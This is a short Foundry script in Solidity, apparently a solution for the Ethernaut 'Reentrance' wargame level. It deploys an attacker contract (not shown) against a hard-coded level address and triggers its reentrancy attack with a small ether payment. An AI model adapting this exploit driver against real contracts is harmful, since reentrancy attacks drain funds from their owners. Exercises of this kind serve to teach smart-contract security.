//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/reentrance/ReentranceAttacker.sol";

contract ReentranceAttack is Script {
    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address levelAddress = 0xF04DE47590E566eBf775Eb603D899472BDC24166;
        ReentranceAttacker reentrance = new ReentranceAttacker(payable(levelAddress));
        reentrance.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
